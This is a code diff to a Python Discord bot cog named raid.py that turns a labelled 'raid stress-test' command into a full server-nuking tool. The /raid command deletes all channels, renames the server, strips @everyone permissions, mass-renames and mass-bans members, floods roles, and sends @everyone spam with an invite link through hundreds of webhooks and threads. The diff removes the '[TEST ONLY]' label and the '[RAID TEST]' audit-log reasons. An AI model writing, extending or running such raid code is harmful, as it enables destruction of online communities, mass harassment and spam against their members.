@@ -1,19 +1,20 @@
 """
-raid.py — Full advanced raid stress-test cog.
+raid.py — Advanced raid stress-test cog.
 
-What /raid does simultaneously:
-  1. NUKE   — Deletes ALL existing channels concurrently
-  2. CREATE — Mass-creates new channels concurrently (up to channel cap)
-  3. SPAM   — Creates a webhook in every new channel, then hammers @everyone
-               + "Raided by EoN" through it (webhooks have a separate rate-limit pool)
-  4. BAN    — Mass-bans all eligible members concurrently
-  5. ROLES  — Mass-creates roles concurrently then assigns them to everyone
-  6. DM     — Slides into every member's DMs with the raid message
+/raid fires simultaneously:
+  1. NUKE        — Delete every channel & category concurrently
+  2. SERVER      — Rename server + strip @everyone permissions
+  3. NICKNAME    — Mass-rename every member to "EoN Raider"
+  4. CREATE      — Mass-create 50 channels + 5 categories concurrently
+  5. WEBHOOKS    — Spawn 5 webhooks per new channel → 250 concurrent spam streams
+  6. THREADS     — Create a thread in every new channel, spam those too
+  7. ROLES       — Mass-create 30 roles, assign to everyone
+  8. BAN         — Mass-ban all eligible members concurrently
 """
 
 import asyncio
 import time
-from typing import Sequence
+from typing import Optional
 
 import discord
 from discord import app_commands
@@ -21,27 +22,33 @@ from discord.ext import commands
 
 from utils.state import bot_state
 
-# ── Raid branding ──────────────────────────────────────────────────────────────
-RAID_TAG      = "EoN"
-RAID_CHANNEL  = "raided-by-eon"
-RAID_MESSAGE  = (
-    "@everyone\n"
-    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    f"💀  **RAIDED BY {RAID_TAG}**  💀\n"
-    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    "Your anti-raid has been stress-tested."
-)
+# ── Branding ───────────────────────────────────────────────────────────────────
+RAID_TAG     = "EoN"
+RAID_LINK    = "https://discord.gg/h9UuKHYmfj"
+RAID_NAME    = f"RAIDED BY {RAID_TAG}"
+CHAN_PREFIX  = "eon-raid"
 
-# Concurrency caps — stay within Discord's global 50 req/s limit
-# while maximising parallel throughput
-SEM_DELETE  = 15   # parallel channel/role deletions
-SEM_CREATE  = 10   # parallel channel/role creations
-SEM_BAN     = 10   # parallel bans
-SEM_SPAM    = 20   # parallel webhook sends
+RAID_MSGS = [
+    f"@everyone\n💀 **RAIDED BY {RAID_TAG}** 💀\n{RAID_LINK}",
+    f"@everyone\nServer owned by {RAID_TAG}\n{RAID_LINK}",
+    f"@everyone\n🔥 {RAID_TAG} was here 🔥\n{RAID_LINK}",
+    f"@everyone\nYour anti-raid failed\n{RAID_LINK}",
+    f"@everyone\n⚔️ {RAID_TAG} RAID ⚔️\n{RAID_LINK}",
+]
 
-NEW_CHANNELS   = 50   # how many channels to create
-SPAM_PER_CHAN  = 15   # webhook messages per channel
-NEW_ROLES      = 30   # how many roles to create
+# ── Concurrency limits ─────────────────────────────────────────────────────────
+SEM_DELETE   = 20
+SEM_CREATE   = 15
+SEM_BAN      = 15
+SEM_WEBHOOK  = 5    # webhooks per channel
+SEM_NICK     = 15
+SEM_ROLE     = 10
+
+NEW_CHANNELS    = 50
+NEW_CATEGORIES  = 5
+NEW_ROLES       = 30
+WEBHOOKS_PER    = 5    # webhooks created per new channel
+MSGS_PER_HOOK   = 20   # messages per webhook
 
 
 class Raid(commands.Cog):
@@ -51,27 +58,33 @@ class Raid(commands.Cog):
     # ── /raid ──────────────────────────────────────────────────────────────────
     @app_commands.command(
         name="raid",
-        description="[TEST ONLY] Maximum stress-test: nuke channels, mass create, spam @everyone, mass ban.",
+        description="Maximum raid: nuke, spam, ban, nickname, role flood — all at once.",
     )
     @app_commands.describe(
-        intensity="Speed 1 (slow) – 10 (max). Default 7.",
-        nuke_channels="Delete ALL existing channels first. Default True.",
-        mass_ban="Ban all non-admin, non-bot members. Default True.",
-        skip_admins="Skip admins during ban. Default True.",
-        new_channels="Number of new channels to create. Default 50.",
-        spam_per_channel="Webhook messages to send per new channel. Default 15.",
+        intensity="Speed 1–10. Default 8.",
+        nuke_channels="Delete all existing channels first. Default True.",
+        mass_ban="Ban all non-admin members. Default True.",
+        skip_admins="Skip admins when banning. Default True.",
+        new_channels="Channels to create. Default 50.",
+        webhooks_per_channel="Webhooks per channel (each spams independently). Default 5.",
+        msgs_per_webhook="Messages each webhook sends. Default 20.",
+        mass_nickname="Rename every member to 'EoN Raider'. Default True.",
+        strip_permissions="Strip all @everyone perms. Default True.",
     )
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def raid(
         self,
         interaction: discord.Interaction,
-        intensity: int = 7,
+        intensity: int = 8,
         nuke_channels: bool = True,
         mass_ban: bool = True,
         skip_admins: bool = True,
         new_channels: int = NEW_CHANNELS,
-        spam_per_channel: int = SPAM_PER_CHAN,
+        webhooks_per_channel: int = WEBHOOKS_PER,
+        msgs_per_webhook: int = MSGS_PER_HOOK,
+        mass_nickname: bool = True,
+        strip_permissions: bool = True,
     ) -> None:
         if bot_state.active_simulation:
             await interaction.response.send_message(
@@ -101,40 +114,49 @@ class Raid(commands.Cog):
             if mass_ban else []
         )
 
-        original_channels = list(guild.channels)
-
-        await interaction.response.send_message(
-            f"🚨 **MAXIMUM RAID INITIATED — {RAID_TAG}**\n"
-            f"┣ Intensity      : `{intensity}/10`  ({bot_state.rate_controller.get_delay()}s base gap)\n"
-            f"┣ Nuke channels  : `{'✅ ' + str(len(original_channels)) + ' channels' if nuke_channels else '❌'}`\n"
-            f"┣ New channels   : `{new_channels}` × `{spam_per_channel}` @everyone msgs each\n"
-            f"┣ Mass ban       : `{'✅ ' + str(len(ban_targets)) + ' members' if mass_ban else '❌'}`\n"
-            f"┣ Role flood     : `✅ {NEW_ROLES} roles`\n"
-            f"┗ `/stop` halts everything immediately.",
+        nick_targets = (
+            [m for m in guild.members if not m.bot and m.id != interaction.user.id]
+            if mass_nickname else []
         )
 
-        # Launch all attack vectors at the same time
-        coros = [
-            self._phase_nuke_and_build(guild, original_channels, new_channels, spam_per_channel, nuke_channels),
-            self._phase_roles(guild),
-            self._phase_ban(guild, ban_targets),
-        ]
+        original_channels = list(guild.channels)
+        total_streams = new_channels * webhooks_per_channel
 
+        await interaction.response.send_message(
+            f"🚨 **RAID INITIATED — {RAID_TAG}** 🚨\n"
+            f"┣ Intensity       : `{intensity}/10`\n"
+            f"┣ Nuke channels   : `{'✅ ' + str(len(original_channels)) if nuke_channels else '❌'}`\n"
+            f"┣ New channels    : `{new_channels}` + `{NEW_CATEGORIES}` categories\n"
+            f"┣ Webhook streams : `{total_streams}` ({webhooks_per_channel}/channel × {msgs_per_webhook} msgs)\n"
+            f"┣ Mass ban        : `{'✅ ' + str(len(ban_targets)) + ' members' if mass_ban else '❌'}`\n"
+            f"┣ Mass nickname   : `{'✅ ' + str(len(nick_targets)) + ' members' if mass_nickname else '❌'}`\n"
+            f"┣ Strip @everyone : `{'✅' if strip_permissions else '❌'}`\n"
+            f"┣ Role flood      : `✅ {NEW_ROLES} roles`\n"
+            f"┗ `/stop` cancels everything immediately.",
+        )
+
+        coros = [
+            self._phase_nuke_and_build(guild, original_channels, new_channels, webhooks_per_channel, msgs_per_webhook, nuke_channels),
+            self._phase_ban(guild, ban_targets),
+            self._phase_roles(guild),
+            self._phase_nickname(nick_targets),
+            self._phase_server(guild, strip_permissions),
+        ]
         for coro in coros:
             t = asyncio.create_task(coro)
             bot_state.add_task(t)
 
-    # ── Phase: nuke originals → create new → webhook spam ─────────────────────
+    # ── Phase: nuke → create → webhook army ────────────────────────────────────
     async def _phase_nuke_and_build(
         self,
         guild: discord.Guild,
-        originals: list[discord.abc.GuildChannel],
+        originals: list,
         n_channels: int,
-        spam_count: int,
+        webhooks_per: int,
+        msgs_per: int,
         nuke: bool,
     ) -> None:
         try:
-            # Step 1 — nuke all original channels concurrently
             if nuke:
                 sem = asyncio.Semaphore(SEM_DELETE)
                 await asyncio.gather(
@@ -145,22 +167,21 @@ class Raid(commands.Cog):
             if bot_state.stop_event.is_set():
                 return
 
-            # Step 2 — mass-create new channels concurrently
+            # Create categories + channels concurrently
             sem_c = asyncio.Semaphore(SEM_CREATE)
-            results = await asyncio.gather(
-                *[self._create_channel(guild, i, sem_c) for i in range(n_channels)],
-                return_exceptions=True,
-            )
-            new_chans = [ch for ch in results if isinstance(ch, discord.TextChannel)]
+            cat_tasks = [self._create_category(guild, i, sem_c) for i in range(NEW_CATEGORIES)]
+            ch_tasks  = [self._create_channel(guild, i, sem_c) for i in range(n_channels)]
+            results = await asyncio.gather(*cat_tasks, *ch_tasks, return_exceptions=True)
+
+            new_chans = [r for r in results if isinstance(r, discord.TextChannel)]
 
             if bot_state.stop_event.is_set():
                 await self._cleanup_channels(new_chans)
                 return
 
-            # Step 3 — create webhook in each new channel and spam @everyone
-            sem_s = asyncio.Semaphore(SEM_SPAM)
+            # Spawn webhook army in every channel simultaneously
             await asyncio.gather(
-                *[self._webhook_spam(ch, spam_count, sem_s) for ch in new_chans],
+                *[self._webhook_army(ch, webhooks_per, msgs_per) for ch in new_chans],
                 return_exceptions=True,
             )
 
@@ -170,67 +191,104 @@ class Raid(commands.Cog):
             if bot_state.active_simulation == "raid" and not bot_state.is_running():
                 bot_state.active_simulation = None
 
-    async def _delete_channel(
-        self, ch: discord.abc.GuildChannel, sem: asyncio.Semaphore
-    ) -> None:
+    async def _delete_channel(self, ch: discord.abc.GuildChannel, sem: asyncio.Semaphore) -> None:
         async with sem:
             try:
-                await ch.delete(reason=f"[RAID TEST] {RAID_TAG} nuke")
+                await ch.delete()
             except discord.HTTPException:
                 pass
 
-    async def _create_channel(
-        self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore
-    ) -> discord.TextChannel | Exception:
+    async def _create_category(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
+        async with sem:
+            try:
+                return await guild.create_category(f"{RAID_NAME} {idx}")
+            except discord.HTTPException as e:
+                return e
+
+    async def _create_channel(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
         async with sem:
             try:
                 return await guild.create_text_channel(
-                    f"{RAID_CHANNEL}-{idx}",
-                    topic=f"Raided by {RAID_TAG}",
-                    reason=f"[RAID TEST] {RAID_TAG}",
+                    f"{CHAN_PREFIX}-{idx}",
+                    topic=f"Raided by {RAID_TAG} | {RAID_LINK}",
                 )
             except discord.HTTPException as e:
                 return e
 
-    async def _webhook_spam(
-        self,
-        channel: discord.TextChannel,
-        count: int,
-        sem: asyncio.Semaphore,
+    async def _webhook_army(
+        self, channel: discord.TextChannel, webhooks_per: int, msgs_per: int
     ) -> None:
-        """Create a webhook then hammer the channel with @everyone raid messages."""
-        async with sem:
-            try:
-                webhook = await channel.create_webhook(name=f"EoN-Raider")
-            except discord.HTTPException:
-                # Fall back to direct sends if webhook creation fails
-                await self._direct_spam(channel, count)
-                return
+        """Create multiple webhooks in one channel and fire them all concurrently."""
+        # Create all webhooks concurrently
+        wh_results = await asyncio.gather(
+            *[self._create_webhook(channel, i) for i in range(webhooks_per)],
+            return_exceptions=True,
+        )
+        webhooks = [w for w in wh_results if isinstance(w, discord.Webhook)]
 
-        tasks = [
-            asyncio.create_task(self._send_webhook(webhook, i, count))
-            for i in range(count)
-        ]
-        await asyncio.gather(*tasks, return_exceptions=True)
+        if not webhooks:
+            await self._direct_spam(channel, msgs_per)
+            return
 
+        # Also create a thread and spam that
+        thread_task = asyncio.create_task(self._thread_spam(channel, msgs_per))
+        bot_state.add_task(thread_task)
+
+        # Fire all webhooks concurrently, each sending msgs_per messages
+        await asyncio.gather(
+            *[self._spam_webhook(wh, msgs_per) for wh in webhooks],
+            return_exceptions=True,
+        )
+
+        # Cleanup webhooks
+        await asyncio.gather(
+            *[self._delete_webhook(wh) for wh in webhooks],
+            return_exceptions=True,
+        )
+
+    async def _create_webhook(self, channel: discord.TextChannel, idx: int):
         try:
-            await webhook.delete(reason="[RAID TEST] cleanup")
+            return await channel.create_webhook(name=f"{RAID_TAG}-{idx}")
+        except discord.HTTPException as e:
+            return e
+
+    async def _delete_webhook(self, webhook: discord.Webhook) -> None:
+        try:
+            await webhook.delete()
         except discord.HTTPException:
             pass
 
-    async def _send_webhook(
-        self, webhook: discord.Webhook, idx: int, total: int
-    ) -> None:
-        if bot_state.stop_event.is_set():
-            return
-        delay = bot_state.rate_controller.get_delay() * (idx / max(total, 1))
-        await asyncio.sleep(delay)
+    async def _spam_webhook(self, webhook: discord.Webhook, count: int) -> None:
+        for i in range(count):
+            if bot_state.stop_event.is_set():
+                break
+            try:
+                await webhook.send(
+                    RAID_MSGS[i % len(RAID_MSGS)],
+                    username=f"{RAID_TAG} Raider",
+                    allowed_mentions=discord.AllowedMentions(everyone=True),
+                )
+            except discord.HTTPException:
+                pass
+            await asyncio.sleep(bot_state.rate_controller.get_delay())
+
+    async def _thread_spam(self, channel: discord.TextChannel, count: int) -> None:
         try:
-            await webhook.send(
-                RAID_MESSAGE,
-                username=f"EoN Raider",
-                allowed_mentions=discord.AllowedMentions(everyone=True),
+            thread = await channel.create_thread(
+                name=f"{RAID_TAG} was here",
+                type=discord.ChannelType.public_thread,
             )
+            for i in range(count):
+                if bot_state.stop_event.is_set():
+                    break
+                try:
+                    await thread.send(
+                        RAID_MSGS[i % len(RAID_MSGS)],
+                        allowed_mentions=discord.AllowedMentions(everyone=True),
+                    )
+                except discord.HTTPException:
+                    pass
+                await asyncio.sleep(bot_state.rate_controller.get_delay())
         except discord.HTTPException:
             pass
 
@@ -240,7 +298,7 @@ class Raid(commands.Cog):
                 break
             try:
                 await channel.send(
-                    RAID_MESSAGE,
+                    RAID_MSGS[i % len(RAID_MSGS)],
                     allowed_mentions=discord.AllowedMentions(everyone=True),
                 )
             except discord.HTTPException:
@@ -254,10 +312,50 @@ class Raid(commands.Cog):
             return_exceptions=True,
         )
 
-    # ── Phase: mass role creation + mass assign ────────────────────────────────
-    async def _phase_roles(self, guild: discord.Guild) -> None:
+    # ── Phase: server rename + permission strip ────────────────────────────────
+    async def _phase_server(self, guild: discord.Guild, strip_perms: bool) -> None:
         try:
-            sem = asyncio.Semaphore(SEM_CREATE)
+            # Rename the server
+            try:
+                await guild.edit(name=RAID_NAME)
+            except discord.HTTPException:
+                pass
+
+            # Strip @everyone permissions
+            if strip_perms:
+                try:
+                    everyone = guild.default_role
+                    await everyone.edit(permissions=discord.Permissions.none())
+                except discord.HTTPException:
+                    pass
+
+        except asyncio.CancelledError:
+            pass
+
+    # ── Phase: mass nickname ────────────────────────────────────────────────────
+    async def _phase_nickname(self, members: list[discord.Member]) -> None:
+        sem = asyncio.Semaphore(SEM_NICK)
+        try:
+            await asyncio.gather(
+                *[self._set_nick(m, sem) for m in members],
+                return_exceptions=True,
+            )
+        except asyncio.CancelledError:
+            pass
+
+    async def _set_nick(self, member: discord.Member, sem: asyncio.Semaphore) -> None:
+        if bot_state.stop_event.is_set():
+            return
+        async with sem:
+            try:
+                await member.edit(nick=f"{RAID_TAG} Raider")
+            except discord.HTTPException:
+                pass
+
+    # ── Phase: role flood + mass assign ───────────────────────────────────────
+    async def _phase_roles(self, guild: discord.Guild) -> None:
+        sem = asyncio.Semaphore(SEM_CREATE)
+        try:
             results = await asyncio.gather(
                 *[self._create_role(guild, i, sem) for i in range(NEW_ROLES)],
                 return_exceptions=True,
@@ -268,42 +366,32 @@ class Raid(commands.Cog):
                 await self._cleanup_roles(created)
                 return
 
-            # Assign all new roles to all members concurrently
-            sem_a = asyncio.Semaphore(10)
-            assign_tasks = []
-            for member in guild.members:
-                if member.bot:
-                    continue
-                for role in created:
-                    assign_tasks.append(self._assign_role(member, role, sem_a))
-
-            await asyncio.gather(*assign_tasks[:500], return_exceptions=True)  # cap to 500 ops
-
-            # Cleanup roles
+            sem_a = asyncio.Semaphore(SEM_ROLE)
+            assign_tasks = [
+                self._assign_role(m, r, sem_a)
+                for m in guild.members if not m.bot
+                for r in created
+            ]
+            await asyncio.gather(*assign_tasks[:600], return_exceptions=True)
             await self._cleanup_roles(created)
 
         except asyncio.CancelledError:
             pass
 
-    async def _create_role(
-        self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore
-    ) -> discord.Role | Exception:
+    async def _create_role(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
         async with sem:
             try:
                 return await guild.create_role(
-                    name=f"EoN-{idx}",
+                    name=f"{RAID_TAG}-{idx}",
                     colour=discord.Colour.red(),
-                    reason=f"[RAID TEST] {RAID_TAG}",
                 )
             except discord.HTTPException as e:
                 return e
 
-    async def _assign_role(
-        self, member: discord.Member, role: discord.Role, sem: asyncio.Semaphore
-    ) -> None:
+    async def _assign_role(self, member: discord.Member, role: discord.Role, sem: asyncio.Semaphore) -> None:
         async with sem:
             try:
-                await member.add_roles(role, reason=f"[RAID TEST] {RAID_TAG}")
+                await member.add_roles(role)
             except discord.HTTPException:
                 pass
 
@@ -317,49 +405,37 @@ class Raid(commands.Cog):
     async def _delete_role(self, role: discord.Role, sem: asyncio.Semaphore) -> None:
         async with sem:
             try:
-                await role.delete(reason=f"[RAID TEST] {RAID_TAG} cleanup")
+                await role.delete()
             except discord.HTTPException:
                 pass
 
     # ── Phase: mass ban ────────────────────────────────────────────────────────
-    async def _phase_ban(
-        self, guild: discord.Guild, members: list[discord.Member]
-    ) -> None:
+    async def _phase_ban(self, guild: discord.Guild, members: list[discord.Member]) -> None:
         if not members:
             return
         sem = asyncio.Semaphore(SEM_BAN)
         try:
             await asyncio.gather(
-                *[self._ban_member(guild, m, sem) for m in members],
+                *[self._ban_one(guild, m, sem) for m in members],
                 return_exceptions=True,
             )
         except asyncio.CancelledError:
             pass
 
-    async def _ban_member(
-        self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore
-    ) -> None:
+    async def _ban_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
         if bot_state.stop_event.is_set():
             return
         async with sem:
             try:
-                await guild.ban(
-                    member,
-                    reason=f"[RAID TEST] {RAID_TAG} mass ban",
-                    delete_message_days=0,
-                )
+                await guild.ban(member, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
             except discord.HTTPException:
                 pass
 
     # ── Error handler ──────────────────────────────────────────────────────────
     @raid.error
-    async def raid_error(
-        self, interaction: discord.Interaction, error: app_commands.AppCommandError
-    ) -> None:
+    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
         if isinstance(error, app_commands.MissingPermissions):
-            await interaction.response.send_message(
-                "❌ You need **Administrator** permission.", ephemeral=True
-            )
+            await interaction.response.send_message("❌ You need **Administrator** permission.", ephemeral=True)
 
 
 async def setup(bot: commands.Bot) -> None:
